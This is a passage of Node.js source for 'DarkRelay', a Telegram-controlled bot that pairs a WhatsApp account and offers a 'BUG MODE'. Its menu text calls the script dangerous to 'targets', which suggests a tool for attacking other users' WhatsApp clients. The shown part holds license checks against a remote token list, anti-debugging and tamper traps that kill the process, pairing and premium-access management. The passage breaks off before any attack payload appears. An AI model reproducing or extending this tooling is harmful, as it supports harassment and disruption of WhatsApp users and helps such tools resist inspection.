const { Telegraf } = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const FormData = require("form-data");
const https = require("https");
const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessage,
  jidDecode,
  areJidsSameUser,
  BufferJSON,
  DisconnectReason,
  proto,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const { tokenBot, ownerID } = require("./settings/config");
const checkOwner = (ctx, next) => {
  const userId = ctx.from.id.toString(); 
  if (!ownerID.includes(userId)) {
    return ctx.reply("❗Mohon Maaf Fitur Ini Khusus Owner");
  }

  return next();
};
const developerID = "1398971818";
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 100) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

const databaseUrl = 'https://raw.githubusercontent.com/animationarmufa-oss/Databasetoken/refs/heads/main/token.json';
const thumbnailUrl = "https://files.catbox.moe/tlrnix.jpg";
const bugurlpp = "https://files.catbox.moe/d5qlyb.jpg";

function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}

function activateSecureMode() {
  secureMode = true;
}

(function() {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }

  setInterval(() => {
    const start = performance.now();
    debugger;
    if (performance.now() - start > 100) {
      throw new Error(randErr());
    }
  }, 1000);

  const code = "AlwaysProtect";
  if (code.length !== 13) {
    throw new Error(randErr());
  }

  function secure() {
    console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣤⣤⣤⣀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠟⠋⠉⠉⠙⠻⣷⡄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠃⠀⢀⣀⣀⡀⠀⠘⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⣴⣿⣿⣿⣿⣦⠀⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⣿⣿⣿⣿⣿⣿⠀⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠘⢿⣿⣿⡿⠃⠀⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣆⠀⠀⠉⠉⠀⠀⣰⡿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣦⣄⣀⣀⣠⣴⠟
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉

> INITIALIZING DarkRelay.exe...
> ACCESS : ROOT
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
#- D A R K R E L A Y

╰➤ INFORMATION:
 ▢ Developer: @Kingarmufa
 ▢ Version: 3.0 ALPHA
 ▢ Status: Bot Connected
  `))
  }
  
  const hash = Buffer.from(secure.toString()).toString("base64");
  setInterval(() => {
    if (Buffer.from(secure.toString()).toString("base64") !== hash) {
      throw new Error(randErr());
    }
  }, 2000);

  secure();
})();

(() => {
  const hardExit = process.exit.bind(process);
  Object.defineProperty(process, "exit", {
    value: hardExit,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  const hardKill = process.kill.bind(process);
  Object.defineProperty(process, "kill", {
    value: hardKill,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  setInterval(() => {
    try {
      if (process.exit.toString().includes("Proxy") ||
          process.kill.toString().includes("Proxy")) {
        console.log(chalk.bold.yellow(`

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣤⣤⣤⣀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠟⠋⠉⠉⠙⠻⣷⡄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠃⠀⢀⣀⣀⡀⠀⠘⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⣴⣿⣿⣿⣿⣦⠀⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⣿⣿⣿⣿⣿⣿⠀⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠘⢿⣿⣿⡿⠃⠀⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣆⠀⠀⠉⠉⠀⠀⣰⡿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣦⣄⣀⣀⣠⣴⠟
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉

> INITIALIZING DarkRelay.exe...
> ACCESS : ROOT
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
#- D A R K R E L A Y

╰➤ INFORMATION:
 ▢ Developer: @Kingarmufa
 ▢ Version: 3.0 ALPHA
 ▢ Status: No Access
  
  Perubahan kode terdeteksi, Harap membeli script kepada reseller
  yang tersedia dan legal
  `))
        activateSecureMode();
        hardExit(1);
      }

      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
        if (process.listeners(sig).length > 0) {
          console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣤⣤⣤⣀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠟⠋⠉⠉⠙⠻⣷⡄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠃⠀⢀⣀⣀⡀⠀⠘⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⣴⣿⣿⣿⣿⣦⠀⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⣿⣿⣿⣿⣿⣿⠀⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠘⢿⣿⣿⡿⠃⠀⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣆⠀⠀⠉⠉⠀⠀⣰⡿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣦⣄⣀⣀⣠⣴⠟
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉

> INITIALIZING DarkRelay.exe...
> ACCESS : ROOT
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
#- D A R K R E L A Y

╰➤ INFORMATION:
 ▢ Developer: @Kingarmufa
 ▢ Version: 3.0 ALPHA
 ▢ Status: No Access
  
  Perubahan kode terdeteksi, Harap membeli script kepada reseller
  yang tersedia dan legal
  `))
        activateSecureMode();
        hardExit(1);
        }
      }
    } catch {
      hardExit(1);
    }
  }, 2000);

  global.validateToken = async (databaseUrl, tokenBot) => {
  try {
    const res = await axios.get(databaseUrl, { timeout: 5000 });
    const tokens = (res.data && res.data.tokens) || [];

    if (!tokens.includes(tokenBot)) {
      console.log(chalk.bold.yellow(`
⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣤⣤⣤⣀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠟⠋⠉⠉⠙⠻⣷⡄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠃⠀⢀⣀⣀⡀⠀⠘⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⣴⣿⣿⣿⣿⣦⠀⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⣿⣿⣿⣿⣿⣿⠀⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠘⢿⣿⣿⡿⠃⠀⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣆⠀⠀⠉⠉⠀⠀⣰⡿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣦⣄⣀⣀⣠⣴⠟
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉

> INITIALIZING DarkRelay.exe...
> ACCESS : ROOT
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
#- D A R K R E L A Y

╰➤ INFORMATION:
 ▢ Developer: @Kingarmufa
 ▢ Version: 3.0 ALPHA
 ▢ Status: No Access
  
  Token tidak terdaftar, Mohon membeli akses kepada reseller yang tersedia
  `));

      try {
      } catch (e) {
      }

      activateSecureMode();
      hardExit(1);
    }
  } catch (err) {
    console.log(chalk.bold.yellow(`

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣤⣤⣤⣀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠟⠋⠉⠉⠙⠻⣷⡄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠃⠀⢀⣀⣀⡀⠀⠘⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⣴⣿⣿⣿⣿⣦⠀⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⣿⣿⣿⣿⣿⣿⠀⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠘⢿⣿⣿⡿⠃⠀⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣆⠀⠀⠉⠉⠀⠀⣰⡿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣦⣄⣀⣀⣠⣴⠟
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉

> INITIALIZING DarkRelay.exe...
> ACCESS : ROOT
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
#- D A R K R E L A Y

╰➤ INFORMATION:
 ▢ Developer: @Kingarmufa
 ▢ Version: 3.0 ALPHA
 ▢ Status: No Access
  
  Gagal menghubungkan ke server, Akses ditolak
  `));
    activateSecureMode();
    hardExit(1);
  }
};
})();

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

async function isAuthorizedToken(token) {
    try {
        const res = await axios.get(databaseUrl);
        const authorizedTokens = res.data.tokens;
        return authorizedTokens.includes(token);
    } catch (e) {
        return false;
    }
}

(async () => {
    await validateToken(databaseUrl, tokenBot);
})();

const bot = new Telegraf(tokenBot);
let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const premiumUserFile = './database/premium_user.json';
const premiumGroupFile = './database/premium_group.json';
const cooldownFile = './database/cooldown.json';

// Helper load/save
const loadData = (filePath) => {
    try {
        const data = fs.readFileSync(filePath);
        return JSON.parse(data);
    } catch {
        return {};
    }
};
const saveData = (filePath, data) => {
    fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
};

// User premium
const loadPremiumUsers = () => loadData(premiumUserFile);
const savePremiumUsers = (users) => saveData(premiumUserFile, users);

const addPremiumUser = (userId, duration) => {
    const users = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    users[userId] = expiryDate;
    savePremiumUsers(users);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const users = loadPremiumUsers();
    delete users[userId];
    savePremiumUsers(users);
};

const isPremiumUser = (userId) => {
    const users = loadPremiumUsers();
    if (users[userId]) {
        const expiryDate = moment(users[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadPremiumGroups = () => loadData(premiumGroupFile);
const savePremiumGroups = (groups) => saveData(premiumGroupFile, groups);

const addPremiumGroup = (groupId, duration) => {
    const groups = loadPremiumGroups();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    groups[groupId] = expiryDate;
    savePremiumGroups(groups);
    return expiryDate;
};

const removePremiumGroup = (groupId) => {
    const groups = loadPremiumGroups();
    delete groups[groupId];
    savePremiumGroups(groups);
};

const isPremiumGroup = (groupId) => {
    const groups = loadPremiumGroups();
    if (groups[groupId]) {
        const expiryDate = moment(groups[groupId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumGroup(groupId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

const startSesi = async () => {
console.clear();
  console.log(chalk.bold.yellow(`

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣤⣤⣤⣀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠟⠋⠉⠉⠙⠻⣷⡄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠃⠀⢀⣀⣀⡀⠀⠘⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⣴⣿⣿⣿⣿⣦⠀⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⣿⣿⣿⣿⣿⣿⠀⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠘⢿⣿⣿⡿⠃⠀⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣆⠀⠀⠉⠉⠀⠀⣰⡿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣦⣄⣀⣀⣠⣴⠟
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉

> INITIALIZING DarkRelay.exe...
> ACCESS : ROOT
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
#- D A R K R E L A Y

╰➤ INFORMATION:
 ▢ Developer: @Kingarmufa
 ▢ Version: 3.0 ALPHA
 ▢ Status: Bot Connected
  `))
    
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'Netrality',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `<blockquote>
#- D A R K R E L A Y

▢ Number: ${lastPairingMessage.phoneNumber}
▢ Pairing Code: ${lastPairingMessage.pairingCode}
▢ Type: Connected
</blockquote>`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.yellow(`

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣤⣤⣤⣀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠟⠋⠉⠉⠙⠻⣷⡄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠃⠀⢀⣀⣀⡀⠀⠘⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⣴⣿⣿⣿⣿⣦⠀⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⣿⣿⣿⣿⣿⣿⠀⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠘⢿⣿⣿⡿⠃⠀⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣆⠀⠀⠉⠉⠀⠀⣰⡿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣦⣄⣀⣀⣠⣴⠟
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉

> INITIALIZING DarkRelay.exe...
> ACCESS : ROOT
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

#- D A R K R E L A Y

╰➤ INFORMATION:
 ▢ Developer: @Kingarmufa
 ▢ Version: 3.0 ALPHA
 ▢ Status: Sender Connected
  `))
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};


startSesi();
setInterval(() => {
  checkGithubUpdate(bot);
}, 60000); // 1 menit
// WhatsApp Connection
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 1000

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    const chatId = ctx.chat.id.toString();
    const userId = ctx.from.id.toString();
    const isGroup = ['group', 'supergroup'].includes(ctx.chat.type);

    if (isGroup) {
        // Cek apakah grup premium
        if (isPremiumGroup(chatId)) {
            return next();
        }
        // Jika grup tidak premium, cek apakah user premium (opsional)
        if (!isPremiumUser(userId)) {
            ctx.reply("❌ ☇ Akses premium hanya untuk grup premium atau user premium");
            return;
        }
        return next();
    } else {
        // Private chat: cek user premium
        if (!isPremiumUser(userId)) {
            ctx.reply("❌ ☇ Akses hanya untuk premium");
            return;
        }
        return next();
    }
};

bot.command("requestpair", async (ctx) => {
   if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /requestpair 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber);  
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `<blockquote>
#- D A R K R E L A Y

▢ Number: ${phoneNumber}
▢ Pairing Code: ${formattedCode}
▢ Type: Not Connected
</blockquote>`;

    const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {  
      caption: pairingMenu,  
      parse_mode: "HTML"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `<blockquote>
#- D A R K R E L A Y

▢ Number: ${lastPairingMessage.phoneNumber}
▢ Pairing Code: ${lastPairingMessage.pairingCode}
▢ Type: Connected
</blockquote>`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "HTML" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

bot.command("setcooldown", async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format: /setcooldown 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.command("resetsession", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

bot.command('addprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addprem 12345678 30d");
    }
    const userId = args[1];
    const duration = parseInt(args[2]);
    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }
    const expiryDate = addPremiumUser(userId, duration);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
});

bot.command('delprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delprem 12345678");
    }
    const userId = args[1];
    removePremiumUser(userId);
        ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});

bot.command('addgroup', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ").filter(Boolean);
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addgroup -1001234567890 30");
    }
    const groupId = args[1];
    const duration = parseInt(args[2]);
    if (isNaN(duration) || duration <= 0) {
        return ctx.reply("🪧 ☇ Durasi harus angka positif (hari)");
    }
    if (!groupId.startsWith('-')) {
        return ctx.reply("🪧 ☇ ID grup harus diawali tanda minus (-), contoh: -1001234567890");
    }
    const expiryDate = addPremiumGroup(groupId, duration);
    ctx.reply(`✅ ☇ ${groupId} berhasil ditambahkan sebagai grup premium sampai ${expiryDate}`);
});

bot.command('delgroup', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ").filter(Boolean);
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delgroup -1001234567890");
    }
    const groupId = args[1];
    const groups = loadPremiumGroups();

    // Cek apakah groupId ada
    if (groups[groupId]) {
        removePremiumGroup(groupId);
        ctx.reply(`✅ ☇ ${groupId} berhasil dihapus dari daftar grup premium`);
    } 
    // Cek apakah ada key kosong (invalid)
    else if (groups[""]) {
        ctx.reply(`⚠️ Ditemukan entry invalid dengan key kosong. Hapus manual file database/premium_group.json atau gunakan perintah /cleargroupdb`);
    }
    else {
        ctx.reply(`🪧 ☇ ${groupId} tidak ada dalam daftar premium. Gunakan /addgroup terlebih dahulu.`);
    }
});

bot.start(ctx => {
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const senderStatus = isWhatsAppConnected ? "Yes" : "No";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
  
    const menuMessage = `<blockquote><tg-emoji emoji-id="5893257006323603821">👻</tg-emoji> 𝘿𝘼𝙍𝙆𝙍𝙀𝙇𝘼𝙔- 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎 <tg-emoji emoji-id="5881702736843511327">⚠️</tg-emoji>
<tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji> هذا البرنامج النصي خطير للغاية على المستخدمين والأهداف، لذا استخدمه بحكمة. <tg-emoji emoji-id="5348349394469022727">🚬</tg-emoji>

<tg-emoji emoji-id="5197531888452925507">🎁</tg-emoji> 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 - 𝙎𝘾𝙍𝙄𝙋𝙏  <tg-emoji emoji-id="5474197700087932281">🎁</tg-emoji>
<tg-emoji emoji-id="4990434466724840555">🪙</tg-emoji> 𝚂𝙲𝚁𝙸𝙿𝚃 𝙽𝙰𝙼𝙴 : 𝘿𝘼𝙍𝙆𝙍𝙀𝙇𝘼𝙔
<tg-emoji emoji-id="4990434466724840555">🪙</tg-emoji> 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 3.0 ALPHA
<tg-emoji emoji-id="4990434466724840555">🪙</tg-emoji> 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : @Kingarmufa
<tg-emoji emoji-id="4990434466724840555">🪙</tg-emoji> 𝙰𝙺𝚂𝙴𝚂 𝙼𝙾𝙳𝙴 : 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎

<tg-emoji emoji-id="5411419730785369685">🎁</tg-emoji> شكرًا لاستخدامك هذا البرنامج النصي. استخدمه استخدامًا حسنًا، ولا تسيء استخدامه لأن ذلك قد يؤدي إلى عقوبات وفقًا للقانون.</blockquote>`;


    const keyboard = [
        [
            {
                text: "𝗔𝗞𝗦𝗘𝗦 ⌂ 𝗠𝗘𝗡𝗨",
                callback_data: "/controls", style: "primary", icon_custom_emoji_id: "5260293700088511294"
            },
            {
                text: "𝗕𝗨𝗚 ⌂ 𝗠𝗢𝗗𝗘",
                callback_data: "/bug", style: "primary", icon_custom_emoji_id: "5893257006323603821"
            }
        ],
        [
            {
